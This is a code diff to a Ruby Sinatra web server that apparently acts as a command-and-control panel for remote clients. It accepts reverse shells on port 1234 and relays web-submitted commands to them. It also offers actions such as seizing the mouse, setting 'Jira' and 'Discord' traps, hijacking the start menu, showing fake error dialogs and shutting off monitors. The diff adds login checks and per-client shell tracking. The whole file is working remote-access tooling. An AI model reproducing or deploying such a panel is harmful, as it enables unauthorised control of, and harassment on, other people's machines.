@@ -9,10 +9,10 @@ $shell = TCPServer.new('0.0.0.0', 1234)
 $loopThread = Thread.new { sleep }
 $shellThread = Thread.new { sleep }
 $semaphore = Mutex.new
-$shellClient
 
 #Global lists
 $clientsList = []
+$shellList = []
 
 $loopThread = Thread.new {
   loop do
@@ -40,8 +40,10 @@ $loopThread = Thread.new {
 $shellThread = Thread.new {
   loop do
     Thread.start($shell.accept) do |sClient|
+      @newClietnIp = sClient.addr.last
+      clientPos = $clientsList.find{ |n| n.ip == @newClietnIp }.id
       begin
-        $shellClient = sClient
+        $shellList[clientPos] = sClient
       rescue
       end
     end
@@ -72,190 +74,259 @@ class MyServer < Sinatra::Base
   end
 
   get '/panel' do
-    if params.empty? || $clientsList[params[:client].to_i].nil?
-      @error = "Did not found client!"
-      erb :home
+    if current_user
+      if params.empty? || $clientsList[params[:client].to_i].nil?
+        @error = "Did not found client!"
+        erb :home
+      else
+        @css = ["panel-styles"]
+        @js = ["panel-js"]
+        erb :panel, locals: {params: params}
+      end
     else
-      @css = ["panel-styles"]
-      @js = ["panel-js"]
-      erb :panel, locals: {params: params}
+      @css = ["login-styles"]
+      erb :login
     end
   end
 
   get '/photos' do
-    if params.empty? || $clientsList[params[:client].to_i].nil?
-      @error = "Did not found client!"
-      erb :home
+    if current_user
+      if params.empty? || $clientsList[params[:client].to_i].nil?
+        @error = "Did not found client!"
+        erb :home
+      else
+        @css = ["photos-styles"]
+        @js = ["photos-js"]
+        erb :photos, locals: {params: params}
+      end
     else
-      @css = ["photos-styles"]
-      @js = ["photos-js"]
-      erb :photos, locals: {params: params}
+      @css = ["login-styles"]
+      erb :login
     end
   end
 
   post '/upload' do
-    @file = params[:file][:tempfile]
-    @file_name = params[:file][:filename].tr_s(" ", "_")
-    if !File.exists?("./public/images/avatars/#{@file_name}")
-      File.open("./public/images/avatars/#{@file_name}", 'wb') do |f|
-        f.write(@file.read)
+    if current_user
+      @file = params[:file][:tempfile]
+      @file_name = params[:file][:filename].tr_s(" ", "_")
+      if !File.exists?("./public/images/avatars/#{@file_name}")
+        File.open("./public/images/avatars/#{@file_name}", 'wb') do |f|
+          f.write(@file.read)
+        end
       end
+      @css = ["photos-styles"]
+      @js = ["photos-js"]
+      erb :photos, locals: {params: params}
+    else
+      @css = ["login-styles"]
+      erb :login
     end
-    @css = ["photos-styles"]
-    @js = ["photos-js"]
-    erb :photos, locals: {params: params}
   end
 
   post '/photo_choosen' do
-    if !params[:avatar].nil?
-        update_photo(params)
+    if current_user
+      if !params[:avatar].nil?
+          update_photo(params)
+      end
+      @js = ["home-js"]
+      erb :home
+    else
+      @css = ["login-styles"]
+      erb :login
     end
-    @js = ["home-js"]
-    erb :home
   end
 
  post '/edit_name' do
+  if current_user
     edit_name(params)
     @js = ["home-js"]
     erb :home
+  else
+    @css = ["login-styles"]
+    erb :login
+    end
   end
 
   post '/vcontrol' do
-    if params.empty? || $clientsList[params[:client_id].to_i].nil?
-      @error = "Did not found client!"
-      erb :home
-    else
-      @mClient = $clientsList[params[:client_id].to_i]
-      case params[:request]
-      when "volup"
-        $semaphore.synchronize { @mClient.volume_up }
-      when "voldw"
-        $semaphore.synchronize { @mClient.volume_down }
-      when "mute"
-        $semaphore.synchronize { @mClient.volume_mute }
+    if current_user
+      if params.empty? || $clientsList[params[:client_id].to_i].nil?
+        @error = "Did not found client!"
+        erb :home
+      else
+        @mClient = $clientsList[params[:client_id].to_i]
+        case params[:request]
+        when "volup"
+          $semaphore.synchronize { @mClient.volume_up }
+        when "voldw"
+          $semaphore.synchronize { @mClient.volume_down }
+        when "mute"
+          $semaphore.synchronize { @mClient.volume_mute }
+        end
       end
+    else
+      @css = ["login-styles"]
+      erb :login
     end
   end
 
   get '/webshell' do
-    if params.empty? || $clientsList[params[:client_id].to_i].nil?
-      @error = "Did not found client!"
-      erb :home
+    if current_user
+      if params.empty? || $clientsList[params[:client_id].to_i].nil?
+        @error = "Did not found client!"
+        erb :home
+      else
+        @mClient = $clientsList[params[:client_id].to_i]
+        $semaphore.synchronize { @mClient.shell }
+      end
+      @css = ["webshell-styles"]
+      @js = ["webshell-js"]
+      erb :webShell, locals: { params: params }
     else
-      @mClient = $clientsList[params[:client_id].to_i]
-      $semaphore.synchronize { @mClient.shell }
+      @css = ["login-styles"]
+      erb :login
     end
-    @css = ["webshell-styles"]
-    @js = ["webshell-js"]
-    erb :webShell, locals: { params: params }
   end
 
   post '/webshell' do
-    @retmsg = []
-    $shellClient.puts(params[:command])
-    begin
-    status = Timeout::timeout(1) {
-      while line = $shellClient.gets
-        @retmsg << line
+    if current_user
+      @retmsg = []
+      shellClient = $shellList[params[:client_id].to_i]
+      shellClient.puts(params[:command])
+      begin
+      status = Timeout::timeout(1) {
+        while line = shellClient.gets
+          @retmsg << line
+        end
+      }
+      rescue
       end
-    }
-    rescue
+      return @retmsg
+    else
+      @css = ["login-styles"]
+      erb :login
     end
-    return @retmsg
   end
 
   get '/volcontrol' do
-    @css = ["vol_control-styles","site-after-styles"]
-    erb :vol_control, locals: { params: params }
+    if current_user
+      @css = ["vol_control-styles","site-after-styles"]
+      erb :vol_control, locals: { params: params }
+    else
+      @css = ["login-styles"]
+      erb :login
+    end
   end
 
   get '/generate_error' do
-    @css = ["error-generator-styles","site-after-styles"]
-    erb :error_generator, locals: { params: params }
+    if current_user
+      @css = ["error-generator-styles","site-after-styles"]
+      erb :error_generator, locals: { params: params }
+    else
+      @css = ["login-styles"]
+      erb :login
+    end
   end
 
   post '/generate_error' do
-    if params.empty? || $clientsList[params[:client_id].to_i].nil?
-      @error = "Did not found client!"
-      erb :home
+    if current_user
+      if params.empty? || $clientsList[params[:client_id].to_i].nil?
+        @error = "Did not found client!"
+        erb :home
+      else
+        @mClient = $clientsList[params[:client_id].to_i]
+        @text = params[:text].gsub(",","")
+        @title = params[:title].gsub(",","")
+        if @text.empty?
+          @text = " "
+        end
+        if @title.empty?
+          @title = " "
+        end
+        @sendText = "#{@text},#{@title},"
+        if !params[:buttons].nil?
+          @sendText = @sendText + params[:buttons]
+        else
+          @sendText = @sendText + "0"
+        end
+        if !params[:icons].nil?
+          @sendText = @sendText + "," + params[:icons]
+        end
+        if params[:text].length > 1000 || params[:title].length > 100
+          @error = "Params too long!"
+        else
+          $semaphore.synchronize { @mClient.send_error(@sendText) }
+        end
+      end
+      @css = ["panel-styles"]
+      erb :panel, locals: {params: params}
     else
-      @mClient = $clientsList[params[:client_id].to_i]
-      @sendText = "#{params[:text].gsub(",","")},#{params[:title].gsub(",","")},"
-      if !params[:buttons].nil?
-        @sendText = @sendText + params[:buttons]
-      else
-        @sendText = @sendText + "0"
-      end
-      if !params[:icons].nil?
-        @sendText = @sendText + "," + params[:icons]
-      end
-      if params[:text].length > 1000 || params[:title].length > 100
-        @error = "Params too long!"
-      else
-        $semaphore.synchronize { @mClient.send_error(@sendText) }
-      end
+      @css = ["login-styles"]
+      erb :login
     end
-    @css = ["panel-styles"]
-    erb :panel, locals: {params: params}
   end
 
   post '/execute' do
-    if params.empty? || $clientsList[params[:client_id].to_i].nil?
-      @error = "Did not found client!"
-      erb :home
-    else
-      @mClient = $clientsList[params[:client_id].to_i]
-      case params[:request]
-      when "shell"
-        $semaphore.synchronize { @mClient.shell }
-        @msg = "Trying open shell on port 1234 from #{@mClient.name}."
-      when "get-mouse"
-        if @mClient.mouseTaken == 0
-          $semaphore.synchronize { @mClient.get_mouse }
-          @msg = "Trying to get mouse on #{@mClient.name}."
-        else
-          $semaphore.synchronize { @mClient.give_mouse_back }
-          @msg = "Giving mouse back to #{@mClient.name}."
-        end
-      when "trap-jira"
-        if @mClient.jiraTrap == 0
-          $semaphore.synchronize { @mClient.trap_on_jira }
-          @msg = "Settting on Jira trap on #{@mClient.name}."
-        else
-          $semaphore.synchronize { @mClient.trap_off_jira }
-          @msg = "Killing Jira trap on #{@mClient.name}."
-        end
-      when "take-over-menustart"
-        if @mClient.menuStart == 0
-          $semaphore.synchronize { @mClient.get_menu_start }
-          @msg = "Killing Menu Start on #{@mClient.name}."
-        else
-          $semaphore.synchronize { @mClient.give_back_start }
-          @msg = "Giving back Menu Start on #{@mClient.name}."
-        end
-      when "set-discord-trap"
-        if @mClient.discordTrap == 0
-          $semaphore.synchronize { @mClient.set_discord_trap }
-          @msg = "Settin on Discord Trap on #{@mClient.name}."
-        else
-          $semaphore.synchronize { @mClient.discard_discord_trap }
-          @msg = "Turning off Discord Trap on #{@mClient.name}."
-        end
-      when "melt-monitor"
-        $semaphore.synchronize { @mClient.melt_monitor }
-        @msg = "Trying to melt #{@mClient.name}\'s screen. \n
-        WARNING: This function has first false positive!"
-      when "bsod"
-        #$semaphore.synchronize { @mClient.bsod }
-        @msg = "Trying... nevermind, #{@mClient.name} is just dead."
-      when "turnoffMonitor"
-        $semaphore.synchronize { @mClient.turn_off_monitor }
-        @msg = "Turning off monitor on #{@mClient.name}..."
+    if current_user
+      if params.empty? || $clientsList[params[:client_id].to_i].nil?
+        @error = "Did not found client!"
+        erb :home
       else
-        @msg = "Błedne polecenie."
+        @mClient = $clientsList[params[:client_id].to_i]
+        case params[:request]
+        when "shell"
+          $semaphore.synchronize { @mClient.shell }
+          @msg = "Trying open shell on port 1234 from #{@mClient.name}."
+        when "get-mouse"
+          if @mClient.mouseTaken == 0
+            $semaphore.synchronize { @mClient.get_mouse }
+            @msg = "Trying to get mouse on #{@mClient.name}."
+          else
+            $semaphore.synchronize { @mClient.give_mouse_back }
+            @msg = "Giving mouse back to #{@mClient.name}."
+          end
+        when "trap-jira"
+          if @mClient.jiraTrap == 0
+            $semaphore.synchronize { @mClient.trap_on_jira }
+            @msg = "Settting on Jira trap on #{@mClient.name}."
+          else
+            $semaphore.synchronize { @mClient.trap_off_jira }
+            @msg = "Killing Jira trap on #{@mClient.name}."
+          end
+        when "take-over-menustart"
+          if @mClient.menuStart == 0
+            $semaphore.synchronize { @mClient.get_menu_start }
+            @msg = "Killing Menu Start on #{@mClient.name}."
+          else
+            $semaphore.synchronize { @mClient.give_back_start }
+            @msg = "Giving back Menu Start on #{@mClient.name}."
+          end
+        when "set-discord-trap"
+          if @mClient.discordTrap == 0
+            $semaphore.synchronize { @mClient.set_discord_trap }
+            @msg = "Settin on Discord Trap on #{@mClient.name}."
+          else
+            $semaphore.synchronize { @mClient.discard_discord_trap }
+            @msg = "Turning off Discord Trap on #{@mClient.name}."
+          end
+        when "melt-monitor"
+          $semaphore.synchronize { @mClient.melt_monitor }
+          @msg = "Trying to melt #{@mClient.name}\'s screen. \n
+          WARNING: This function has first false positive!"
+        when "bsod"
+          #$semaphore.synchronize { @mClient.bsod }
+          @msg = "Trying... nevermind, #{@mClient.name} is just dead."
+        when "turnoffMonitor"
+          $semaphore.synchronize { @mClient.turn_off_monitor }
+          @msg = "Turning off monitor on #{@mClient.name}..."
+        else
+          @msg = "Błedne polecenie."
+        end
+        @css = ["site-after-styles"]
+        erb :site_after, locals: {params: params}
       end
-      @css = ["site-after-styles"]
-      erb :site_after, locals: {params: params}
+    else
+      @css = ["login-styles"]
+      erb :login
     end
   end
 
